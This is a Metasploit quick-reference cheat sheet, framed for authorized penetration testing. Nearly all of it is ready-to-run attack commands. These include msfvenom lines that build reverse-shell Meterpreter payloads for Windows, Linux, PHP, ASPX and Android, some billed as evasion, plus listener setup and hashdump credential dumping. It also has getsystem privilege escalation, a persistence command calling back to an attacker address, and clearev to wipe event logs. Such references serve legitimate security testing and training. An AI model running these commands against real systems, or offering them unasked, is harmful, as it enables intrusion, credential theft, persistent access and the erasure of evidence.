
# Metasploit Framework Quick Reference (2025)

> **For authorized penetration testing only**  
> Always obtain written permission before testing any system.

---

## 1. Payload Generation with `msfvenom`

### Windows Payloads
```bash
# Staged (x64)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe > payload.exe

# Stageless (x86)
msfvenom -p windows/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f exe > payload_stageless.exe

# HTTPS Transport (evasion)
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> LPORT=443 -f exe > payload_https.exe
```

### Linux Payloads
```bash
# x64
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f elf > payload.elf

# x86
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f elf > payload_x86.elf
```

### Web Payloads
```bash
# PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f raw > payload.php

# ASPX
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f aspx > payload.aspx
```

### Android Payloads
```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f raw > payload.apk
```

---

## 2. Listener Configuration with `msfconsole`

### Basic TCP Listener
```bash
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <IP>
set LPORT 4444
set ExitOnSession false
exploit -j
```

### HTTPS Listener (Better Evasion)
```bash
set PAYLOAD windows/x64/meterpreter/reverse_https
set LPORT 443
exploit -j
```

---

## 3. Meterpreter Session Management

### Session Interaction
```bash
sessions -l          # List sessions
sessions -i 1        # Interact with session 1
background           # Background current session
```

### Common Commands
```bash
sysinfo             # System information
getuid              # Current user context
ps                  # List running processes
migrate <PID>       # Migrate to another process
hashdump            # Dump SAM hashes (Admin required)
```

---

## 4. Post-Exploitation

### Privilege Escalation (Windows)
```bash
use post/windows/escalate/getsystem
run
```

### Persistence (Windows)
```bash
run persistence -U -i 60 -p 443 -r <IP>
```

---

## 5. Cleanup

### Remove Artifacts
```bash
rm payload.exe
clearev  # Clear logs
```

### Kill Handlers
```bash
jobs -K
```

---

## Legal & Ethical Reminder
- **Always** operate within authorized scope.
- Document all actions for reporting.
- Avoid production systems unless explicitly permitted.
```

